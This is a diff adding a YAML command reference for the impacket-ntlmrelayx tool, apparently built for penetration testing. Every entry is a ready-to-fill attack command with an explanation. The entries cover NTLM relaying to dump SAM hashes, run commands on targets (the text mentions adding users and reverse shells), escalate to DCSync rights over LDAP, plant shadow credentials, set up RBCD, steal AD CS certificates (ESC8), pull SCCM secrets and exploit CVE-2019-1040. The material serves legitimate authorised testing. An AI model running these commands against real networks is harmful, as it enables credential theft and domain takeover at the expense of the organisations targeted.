@@ -1,0 +1,111 @@
+tool: impacket-ntlmrelayx
+tags: [network, pentest, exploitation, ntlm, relay, smb, ldap, adcs, sccm]
+
+actions:
+# === SMB RELAY OPERATIONS ===
+
+ - title: impacket-ntlmrelayx - dump sam hashes
+   desc: |
+     Relays incoming NTLM authentication to a specific target to dump SAM hashes. 
+     This is the most common use case when you have local administrator credentials being relayed. 
+     The tool automatically invokes secretsdump functionality if the relayed user has sufficient privileges.
+     It is highly recommended to use -smb2support for compatibility with modern Windows systems.
+   command: "impacket-ntlmrelayx -t {{target_ip}} -smb2support"
+
+ - title: impacket-ntlmrelayx - relay to multiple targets
+   desc: |
+     Relays NTLM credentials to a list of targets defined in a text file. 
+     This allows for lateral movement across an entire subnet by attempting to relay any captured session to all possible hosts. 
+     The -w flag can be added to watch the file for changes dynamically. 
+     Useful in combination with Responder or LLMNR/NetBIOS poisoning techniques.
+   command: "impacket-ntlmrelayx -tf {{targets_file}} -smb2support"
+
+ - title: impacket-ntlmrelayx - execute system command
+   desc: |
+     Executes a specific shell command on the target system upon a successful relay. 
+     Instead of dumping hashes, this allows for direct interaction such as adding a user or starting a reverse shell. 
+     Be aware that command execution via SMB (typically using service creation) is highly likely to be flagged by EDR/AV. 
+     Ensure the command is properly escaped if it contains special characters.
+   command: "impacket-ntlmrelayx -t {{target_ip}} -c \"{{command|whoami}}\""
+
+# === SOCKS PROXY MODE ===
+
+ - title: impacket-ntlmrelayx - socks proxy mode
+   desc: |
+     Starts a SOCKS proxy that keeps relayed sessions alive for manual use. 
+     This is one of the most powerful features as it allows you to use other tools like smbclient.py or crackmapexec through the proxy. 
+     Sessions are listed in the 'socks' command within the tool's interface or via the HTTP API. 
+     It bypasses the need for immediate automated action and allows for surgical post-exploitation.
+   command: "impacket-ntlmrelayx -tf {{targets_file}} -socks -smb2support"
+
+# === LDAP & ACTIVE DIRECTORY ATTACKS ===
+
+ - title: impacket-ntlmrelayx - ldap privilege escalation
+   desc: |
+     Relays authentication to a Domain Controller via LDAP to escalate privileges for a specific user. 
+     It attempts to modify the Access Control List (ACL) of the domain object to grant the attacker 'DCSync' rights. 
+     This requires relaying a user who already has permissions to modify domain ACLs (like a Domain Admin). 
+     The --escalate-user flag specifies which account will receive the new privileges.
+   command: "impacket-ntlmrelayx -t ldap://{{domain_controller_ip}} --escalate-user {{attacker_username}}"
+
+ - title: impacket-ntlmrelayx - shadow credentials attack
+   desc: |
+     Performs the Shadow Credentials attack by modifying the msDS-KeyCredentialLink attribute. 
+     This allows an attacker to take over a computer or user account without changing their password. 
+     The attack results in a certificate that can be used for PKINIT authentication to get a TGT. 
+     Targeting a Domain Controller via LDAP is a common way to achieve Domain Admin status with this method.
+   command: "impacket-ntlmrelayx -t ldap://{{domain_controller_ip}} --shadow-credentials --shadow-target {{target_account_name}}"
+
+ - title: impacket-ntlmrelayx - delegate access (resource-based constrained delegation)
+   desc: |
+     Relays to LDAP to configure Resource-Based Constrained Delegation (RBCD). 
+     It grants a computer account controlled by the attacker the right to impersonate users to the relayed target. 
+     This is a stealthy way to maintain persistence and gain administrative access to machines. 
+     Requires a machine account or a user with the ability to create machine accounts (ms-DS-MachineAccountQuota).
+   command: "impacket-ntlmrelayx -t ldap://{{domain_controller_ip}} --delegate-access --escalate-user {{attacker_machine_account}}"
+
+# === AD CS (CERTIFICATE SERVICES) ATTACKS ===
+
+ - title: impacket-ntlmrelayx - ad cs relay (esc1/esc6)
+   desc: |
+     Relays NTLM authentication to an AD CS Web Enrollment endpoint to request a certificate. 
+     The resulting certificate can be used to authenticate as the relayed user or machine. 
+     This is particularly effective against Domain Controllers to perform the 'ESC8' attack. 
+     You must specify the correct template, usually 'Machine' for computers or 'User' for users.
+   command: "impacket-ntlmrelayx -t http://{{ca_ip}}/certsrv/certfnsh.asp --adcs --template {{template|Machine}}"
+
+# === SPECIALIZED ATTACKS (SCCM & MSSQL) ===
+
+ - title: impacket-ntlmrelayx - sccm policy secret dump
+   desc: |
+     Exploits SCCM (MECM) by relaying a machine account to the Management Point. 
+     The tool registers a fake device and requests secret policies which often contain network access account credentials. 
+     The target URL must point to the specific SCCM windowsauth endpoint. 
+     This is a very effective way to escalate from a local machine compromise to broader network access.
+   command: "impacket-ntlmrelayx -t http://{{sccm_mp_ip}}/ccm_system_windowsauth/request --sccm-policies"
+
+ - title: impacket-ntlmrelayx - mssql query execution
+   desc: |
+     Relays authentication to an MSSQL server and executes a SQL query. 
+     This can be used to extract data, create new database users, or even gain OS-level access if xp_cmdshell is enabled. 
+     Multiple queries can be specified by repeating the -q flag. 
+     Relaying a sysadmin user provides full control over the database instance.
+   command: "impacket-ntlmrelayx -t mssql://{{sql_server_ip}} -q \"{{sql_query|SELECT @@version;}}\""
+
+# === ADVANCED CONFIGURATION ===
+
+ - title: impacket-ntlmrelayx - remove mic (cve-2019-1040)
+   desc: |
+     Exploits CVE-2019-1040 by removing the Message Integrity Check (MIC) from the NTLM authentication. 
+     This allows relaying to services that strictly require NTLMv2 and have MIC enabled, such as LDAPS. 
+     It is essential for successful LDAP relaying on patched systems. 
+     Combine this with -smb2support for maximum effectiveness.
+   command: "impacket-ntlmrelayx -t ldaps://{{domain_controller_ip}} --remove-mic --smb2support"
+
+ - title: impacket-ntlmrelayx - serve custom image (wpad)
+   desc: |
+     Used during WPAD/Proxy attacks to serve a specific image to the victim. 
+     When victims attempt to authenticate to a fake proxy, this image is displayed if the browser requests one. 
+     It helps in making the attack look more legitimate or can be used for basic tracking. 
+     Often used with the -wh (WPAD Host) flag.
+   command: "impacket-ntlmrelayx -t {{target_ip}} --serve-image {{image_path|/tmp/logo.png}}"
